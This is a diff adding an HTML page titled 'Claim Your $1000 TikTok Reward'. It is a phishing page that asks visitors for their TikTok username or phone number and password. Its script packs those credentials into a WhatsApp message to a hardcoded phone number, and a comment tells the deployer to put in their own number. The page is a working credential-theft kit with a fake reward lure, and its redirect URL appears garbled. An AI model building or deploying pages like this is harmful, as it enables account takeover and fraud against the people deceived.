@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your $1000 TikTok Reward</title>
+    <link rel="stylesheet" href="me.css">
+</head>
+<body>
+    <div class="container">
+        <div class="card" id="form-card">
+            <!-- TikTok Icon -->
+            <div class="tiktok-icon"></div>
+            
+            <h1>Claim Your $1000</h1>
+            <p>Enter your TikTok username or phone number and password to verify your account and claim your reward instantly.</p>
+            
+            <form id="claim-form">
+                <!-- Username / Phone -->
+                <div class="input-group">
+                    <label for="username">TikTok Username or Phone Number</label>
+                    <input type="text" id="username" placeholder="@username or +234..." required>
+                </div>
+                
+                <!-- Password -->
+                <div class="input-group">
+                    <label for="password">Enter Password</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                
+                <!-- Submit Button -->
+                <button type="submit" class="submit-btn">
+                    Submit & Claim $1000
+                </button>
+            </form>
+            
+            <div class="success-message" id="success-msg">
+                ✅ Verification successful! Redirecting to WhatsApp...
+            </div>
+            
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('claim-form');
+        const successMsg = document.getElementById('success-msg');
+        
+        // ←←← CHANGE THIS TO YOUR ACTUAL WHATSAPP NUMBER (with country code)
+        const whatsappNumber = "2348064811587";   
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (username === "" || password === "") {
+                alert("Please fill in all fields");
+                return;
+            }
+            
+            // Show success message
+            successMsg.style.display = 'block';
+            
+            // Simulate processing then redirect to WhatsApp
+            setTimeout(() => {
+                const message = encodeURIComponent(
+                    `🎉 Claim Request:\n\n` +
+                    `TikTok Username/Phone: ${username}\n` +
+                    `Password: ${password}\n\n` +
+                    `Please process my $1000 claim.`
+                );
+                
+                window.location.href = `https://wa.me/\( {whatsappNumber}?text= \){message}`;
+            }, 1800);
+        });
+    </script>
+</body>
+</html>
